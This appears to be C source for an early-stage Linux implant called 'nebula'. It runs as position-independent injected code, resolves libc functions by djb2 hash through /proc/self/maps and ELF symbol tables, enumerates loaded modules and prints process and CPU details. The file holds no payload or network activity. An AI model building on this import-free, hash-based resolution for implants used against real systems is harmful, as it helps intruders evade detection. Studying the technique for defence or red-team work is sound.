/**
 * @file nebula.c
 * @brief core implant initialisation and exec
 * @date 2025-12-12
 *
 * single comp unit for position-independent exec.
 * without external funct calls except resolved libc
 */


#include "../include/nebula.h"


static nebula_ctx_t _ctx;


static const u8 _elf_magic[] = { 0x7f, 'E', 'L', 'F' };


/* ─────────────────────────────────────────────────────────────────────────────
 * crc32
 * ───────────────────────────────────────────────────────────────────────────── */


u32 crc32(const void *data, size_t len)
{
    const u8 *p = data;
    u32 crc = 0xffffffff;

    for (size_t i = 0; i < len; i++)
    {
        crc ^= p[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xedb88320 & -(crc & 1));
    }

    return ~crc;
}


/* ─────────────────────────────────────────────────────────────────────────────
 * mem util
 * ───────────────────────────────────────────────────────────────────────────── */


static i32 _memcmp(const void *a, const void *b, size_t n)
{
    const u8 *p = a, *q = b;

    for (size_t i = 0; i < n; i++)
    {
        if (p[i] != q[i])
            return (i32)(p[i] - q[i]);
    }

    return 0;
}


static void *_memcpy(void *dst, const void *src, size_t n)
{
    u8 *d = dst;
    const u8 *s = src;

    for (size_t i = 0; i < n; i++)
        d[i] = s[i];

    return dst;
}


static void *_memset(void *dst, int c, size_t n)
{
    u8 *d = dst;

    for (size_t i = 0; i < n; i++)
        d[i] = (u8) c;

    return dst;
}


static size_t _strlen(const char *s)
{
    size_t len = 0;

    while (s[len])
        len++;

    return len;
}


/* ─────────────────────────────────────────────────────────────────────────────
 * elf util
 * ───────────────────────────────────────────────────────────────────────────── */


static bool _is_elf(uptr addr)
{
    if (!addr)
        return false;

    const elf64_ehdr_t *e = (const elf64_ehdr_t *) addr;

    if (_memcmp(e->e_ident, _elf_magic, 4) != 0)
        return false;

    return e->e_ident[EI_CLASS] == ELFCLASS64;
}


static u64 _hex2u64(const char *s, size_t max)
{
    u64 v = 0;

    for (size_t i = 0; i < max && s[i]; i++)
    {
        char c = s[i];
        u64 d;

        if (c >= '0' && c <= '9')
            d = c - '0';
        else if (c >= 'a' && c <= 'f')
            d = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F')
            d = c - 'A' + 10;
        else
            break;

        v = (v << 4) | d;
    }

    return v;
}


static elf64_dyn_t *_find_dyn(uptr base)
{
    const elf64_ehdr_t *e = (const elf64_ehdr_t *) base;
    const elf64_phdr_t *p = (const elf64_phdr_t *) (base + e->e_phoff);

    for (u32 i = 0; i < e->e_phnum && i < ITER_MAX; i++)
    {
        if (p[i].p_type == PT_DYNAMIC)
            return (elf64_dyn_t *) (base + p[i].p_vaddr);
    }

    return NULL;
}


/* ─────────────────────────────────────────────────────────────────────────────
 * cpu introspection (kinda brokey rn)
 * ───────────────────────────────────────────────────────────────────────────── */


static void _read_cpu_info(nebula_cpu_t *cpu)
{
    _memset(cpu, 0, sizeof(*cpu));

    char buf[1024];
    const char path[] = "/proc/cpuinfo";

    i64 fd = sys_openat(AT_FDCWD, path, O_RDONLY);
    if (fd < 0)
        return;

    i64 n = sys_read((i32) fd, buf, sizeof(buf) - 1);
    sys_close((i32) fd);

    if (n <= 0)
        return;

    buf[n] = '\0';

    const char *p = buf;
    while (*p)
    {
        if (_memcmp(p, "CPU implementer", 15) == 0)
        {
            while (*p && *p != ':') p++;
            if (*p == ':') p++;
            while (*p == ' ' || *p == '\t') p++;
            cpu->impl = (u8) _hex2u64(p, 4);
        }
        else if (_memcmp(p, "CPU part", 8) == 0)
        {
            while (*p && *p != ':') p++;
            if (*p == ':') p++;
            while (*p == ' ' || *p == '\t') p++;
            cpu->part = (u16) _hex2u64(p, 6);
        }
        else if (_memcmp(p, "CPU revision", 12) == 0)
        {
            while (*p && *p != ':') p++;
            if (*p == ':') p++;
            while (*p == ' ' || *p == '\t') p++;
            cpu->rev = (u8) _hex2u64(p, 4);
        }

        while (*p && *p != '\n') p++;
        if (*p) p++;
    }
}


/* ─────────────────────────────────────────────────────────────────────────────
 * proc introspection
 * ───────────────────────────────────────────────────────────────────────────── */


static void _read_proc_comm(char *buf, size_t len)
{
    const char path[] = "/proc/self/comm";

    i64 fd = sys_openat(AT_FDCWD, path, O_RDONLY);
    if (fd < 0)
    {
        buf[0] = '?';
        buf[1] = '\0';
        return;
    }

    i64 n = sys_read((i32) fd, buf, len - 1);
    sys_close((i32) fd);

    if (n > 0)
    {
        if (buf[n - 1] == '\n')
            buf[n - 1] = '\0';
        else
            buf[n] = '\0';
    }
    else
    {
        buf[0] = '?';
        buf[1] = '\0';
    }
}


/* ─────────────────────────────────────────────────────────────────────────────
 * module enumeration
 * ───────────────────────────────────────────────────────────────────────────── */


static u32 _enum_modules(nebula_ctx_t *ctx)
{
    char buf[4096];
    const char path[] = "/proc/self/maps";

    i64 fd = sys_openat(AT_FDCWD, path, O_RDONLY);
    if (fd < 0)
        return 0;

    i64 n = sys_read((i32) fd, buf, sizeof(buf) - 1);
    sys_close((i32) fd);

    if (n <= 0)
        return 0;

    buf[n] = '\0';

    const char *line = buf;
    u32 cnt = 0;

    while (*line && cnt < MAX_MODULES)
    {
        uptr base = _hex2u64(line, 16);

        const char *p = line;
        while (*p && *p != ' ')
            p++;
        while (*p == ' ')
            p++;

        u8 perms = 0;
        if (p[0] == 'r') perms |= 0x4;
        if (p[1] == 'w') perms |= 0x2;
        if (p[2] == 'x') perms |= 0x1;

        const char *path_start = line;
        while (*path_start && *path_start != '\n' && *path_start != '/')
            path_start++;

        if (*path_start == '/')
        {
            const char *name = path_start;
            const char *q = path_start;

            while (*q && *q != '\n')
            {
                if (*q == '/')
                    name = q + 1;
                q++;
            }

            size_t name_len = 0;
            for (const char *r = name; *r && *r != '\n'; r++)
                name_len++;

            u32 hash = djb2n(name, name_len);

            bool seen = false;
            for (u32 i = 0; i < cnt; i++)
            {
                if (ctx->mods[i].hash == hash)
                {
                    seen = true;
                    break;
                }
            }

            if (!seen && _is_elf(base))
            {
                nebula_mod_t *m = &ctx->mods[cnt];
                m->base  = base;
                m->hash  = hash;
                m->perms = perms;

                size_t path_len = (size_t)(q - path_start);
                if (path_len >= MAX_PATH_LEN)
                    path_len = MAX_PATH_LEN - 1;
                _memcpy(m->path, path_start, path_len);
                m->path[path_len] = '\0';

                cnt++;
            }
        }

        while (*line && *line != '\n')
            line++;
        if (*line)
            line++;
    }

    return cnt;
}


/* ─────────────────────────────────────────────────────────────────────────────
 * resolution
 * ───────────────────────────────────────────────────────────────────────────── */


uptr resolve_mod(u32 hash)
{
    char buf[4096];
    const char path[] = "/proc/self/maps";

    i64 fd = sys_openat(AT_FDCWD, path, O_RDONLY);
    if (fd < 0)
        return 0;

    i64 n = sys_read((i32) fd, buf, sizeof(buf) - 1);
    sys_close((i32) fd);

    if (n <= 0)
        return 0;

    buf[n] = '\0';
    const char *line = buf;
    u32 cnt = 0;

    while (*line && cnt++ < 64)
    {
        uptr base = _hex2u64(line, 16);
        const char *p = line;

        while (*p && *p != '\n' && *p != '/')
            p++;

        if (*p == '/')
        {
            const char *name = p;
            const char *q = p;

            while (*q && *q != '\n')
            {
                if (*q == '/')
                    name = q + 1;
                q++;
            }

            size_t len = 0;
            for (const char *r = name; *r && *r != '\n'; r++)
                len++;

            if (djb2n(name, len) == hash && _is_elf(base))
                return base;
        }

        while (*line && *line != '\n')
            line++;
        if (*line)
            line++;
    }

    return 0;
}


uptr resolve_sym(uptr base, u32 hash)
{
    if (!base || !hash || !_is_elf(base))
        return 0;

    elf64_dyn_t *dyn = _find_dyn(base);
    if (!dyn)
        return 0;

    elf64_sym_t *symtab = NULL;
    const char *strtab = NULL;
    u64 strsz = 0;
    u32 cnt = 0;

    while (dyn->d_tag != DT_NULL && cnt++ < ITER_MAX)
    {
        switch (dyn->d_tag)
        {
        case DT_SYMTAB:
            symtab = (elf64_sym_t *) dyn->d_un.d_ptr;
            break;
        case DT_STRTAB:
            strtab = (const char *) dyn->d_un.d_ptr;
            break;
        case DT_STRSZ:
            strsz = dyn->d_un.d_val;
            break;
        }
        dyn++;
    }

    if (!symtab || !strtab || !strsz)
        return 0;

    for (elf64_sym_t *s = symtab; (uptr) s < (uptr) strtab; s++)
    {
        if (!s->st_name || !s->st_value || s->st_name >= strsz)
            continue;

        u8 type = ELF64_ST_TYPE(s->st_info);
        if (type != STT_FUNC && type != STT_OBJECT)
            continue;

        if (djb2(strtab + s->st_name) == hash)
            return base + s->st_value;
    }

    return 0;
}


/* ─────────────────────────────────────────────────────────────────────────────
 * output
 * ───────────────────────────────────────────────────────────────────────────── */


static void _puts(nebula_ctx_t *ctx, const char *s)
{
    ctx->libc.write(STDERR_FILENO, s, _strlen(s));
}


static void _putc(nebula_ctx_t *ctx, char c)
{
    ctx->libc.write(STDERR_FILENO, &c, 1);
}


static void _puthex(nebula_ctx_t *ctx, u64 v, int width)
{
    static const char hex[] = "0123456789abcdef";
    char buf[18] = { '0', 'x' };

    for (int i = width - 1; i >= 0; i--)
        buf[2 + ((width - 1) - i)] = hex[(v >> (i * 4)) & 0xf];

    ctx->libc.write(STDERR_FILENO, buf, (size_t)(2 + width));
}


static void _putdec(nebula_ctx_t *ctx, u64 v)
{
    char buf[21];
    int i = 20;

    buf[i] = '\0';

    if (v == 0)
    {
        buf[--i] = '0';
    }
    else
    {
        while (v && i > 0)
        {
            buf[--i] = '0' + (v % 10);
            v /= 10;
        }
    }

    _puts(ctx, &buf[i]);
}


static void _putperms(nebula_ctx_t *ctx, u8 perms)
{
    _putc(ctx, (perms & 0x4) ? 'r' : '-');
    _putc(ctx, (perms & 0x2) ? 'w' : '-');
    _putc(ctx, (perms & 0x1) ? 'x' : '-');
}


/* ─────────────────────────────────────────────────────────────────────────────
 * initialisationn
 * ───────────────────────────────────────────────────────────────────────────── */


static bool _resolve_libc(nebula_ctx_t *ctx)
{
    uptr b = ctx->libc.base;

    if (!b)
        return false;

    ctx->libc.write = (fn_write_t) resolve_sym(b, djb2("write"));
    if (!ctx->libc.write)
        return false;

    ctx->libc.read     = (fn_read_t)     resolve_sym(b, djb2("read"));
    ctx->libc.mmap     = (fn_mmap_t)     resolve_sym(b, djb2("mmap"));
    ctx->libc.mprotect = (fn_mprotect_t) resolve_sym(b, djb2("mprotect"));
    ctx->libc.munmap   = (fn_munmap_t)   resolve_sym(b, djb2("munmap"));
    ctx->libc.exit     = (fn_exit_t)     resolve_sym(b, djb2("exit"));

    return true;
}


bool nebula_init(nebula_ctx_t *ctx, uptr base)
{
    if (!ctx)
        return false;

    _memset(ctx, 0, sizeof(*ctx));

    ctx->self.base = base;
    ctx->self.size = (size_t)(__end - __start);
    ctx->self.crc  = crc32((void *) base, ctx->self.size);

    ctx->proc.pid = sys_getpid();
    _read_proc_comm(ctx->proc.comm, sizeof(ctx->proc.comm));

    /*  TODO: fix reading cpuinfo  */
    _read_cpu_info(&ctx->cpu);

    ctx->libc.base = resolve_mod(djb2("libc.so.6"));
    if (!ctx->libc.base)
        ctx->libc.base = resolve_mod(djb2("libc-2.31.so"));
    if (!ctx->libc.base)
        ctx->libc.base = resolve_mod(djb2("libc.musl-aarch64.so.1"));

    if (!ctx->libc.base)
        return false;

    if (!_resolve_libc(ctx))
        return false;

    ctx->mod_cnt = _enum_modules(ctx);

    ctx->ready = true;
    return true;
}


/* ─────────────────────────────────────────────────────────────────────────────
 * execution
 * ───────────────────────────────────────────────────────────────────────────── */


void nebula_exec(nebula_ctx_t *ctx)
{
    if (!ctx || !ctx->ready)
        return;

    _puts(ctx, "\n");
    _puts(ctx, " _____                                _____  \n");
    _puts(ctx, "( ___ )------------------------------( ___ ) \n");
    _puts(ctx, " |   |                                |   |  \n");
    _puts(ctx, " |   |           |         |          |   |  \n");
    _puts(ctx, " |   | ,---.,---.|---..   .|   ,---.  |   |  \n");
    _puts(ctx, " |   | |   ||---'|   ||   ||    ,---| |   |  \n");
    _puts(ctx, " |   | `   '`---'`---'`---'`---'`---^ |   |  \n");
    _puts(ctx, " |___|                                |___|  \n");
    _puts(ctx, "(_____)------------------------------(_____)  v");
    _putdec(ctx, NEBULA_VERSION_MAJOR);
    _putc(ctx, '.');
    _putdec(ctx, NEBULA_VERSION_MINOR);
    _putc(ctx, '.');
    _putdec(ctx, NEBULA_VERSION_PATCH);
    _puts(ctx, "\n\n");

    _puts(ctx, "──[ self ]──────────────────────────────────────────\n");
    _puts(ctx, "  base : ");
    _puthex(ctx, ctx->self.base, 16);
    _puts(ctx, "\n  size : ");
    _putdec(ctx, ctx->self.size);
    _puts(ctx, " bytes\n  crc  : ");
    _puthex(ctx, ctx->self.crc, 8);
    _puts(ctx, "\n");

    _puts(ctx, "\n──[ proc ]──────────────────────────────────────────\n");
    _puts(ctx, "  pid  : ");
    _putdec(ctx, (u64) ctx->proc.pid);
    _puts(ctx, "\n  comm : ");
    _puts(ctx, ctx->proc.comm);
    _puts(ctx, "\n");

    _puts(ctx, "\n──[ cpu ]───────────────────────────────────────────\n");
    _puts(ctx, "  impl : ");
    _puthex(ctx, ctx->cpu.impl, 2);
    _puts(ctx, "  part : ");
    _puthex(ctx, ctx->cpu.part, 4);
    _puts(ctx, "  rev  : ");
    _puthex(ctx, ctx->cpu.rev, 2);
    _puts(ctx, "\n");

    _puts(ctx, "\n──[ libc ]──────────────────────────────────────────\n");
    _puts(ctx, "  base : ");
    _puthex(ctx, ctx->libc.base, 16);
    _puts(ctx, "\n  write: ");
    _puthex(ctx, (uptr) ctx->libc.write, 16);
    _puts(ctx, "\n  mmap : ");
    _puthex(ctx, (uptr) ctx->libc.mmap, 16);
    _puts(ctx, "\n");

    _puts(ctx, "\n──[ modules ]───────────────────────────────────────\n");
    for (u32 i = 0; i < ctx->mod_cnt && i < 8; i++)
    {
        nebula_mod_t *m = &ctx->mods[i];
        _puts(ctx, "  ");
        _puthex(ctx, m->base, 12);
        _puts(ctx, " ");
        _putperms(ctx, m->perms);
        _puts(ctx, " ");
        _puts(ctx, m->path);
        _puts(ctx, "\n");
    }
    if (ctx->mod_cnt > 8)
    {
        _puts(ctx, "  ... +");
        _putdec(ctx, ctx->mod_cnt - 8);
        _puts(ctx, " more\n");
    }

    _puts(ctx, "\n────────────────────────────────────────────────────\n");
    _puts(ctx, "neb:  ready!!!\n\n");
}


/* ─────────────────────────────────────────────────────────────────────────────
 * entry
 * ───────────────────────────────────────────────────────────────────────────── */


__visible void nebula_entry(uptr base, void *arg)
{
    (void) arg;

    if (!nebula_init(&_ctx, base))
        sys_exit(1);

    nebula_exec(&_ctx);
}
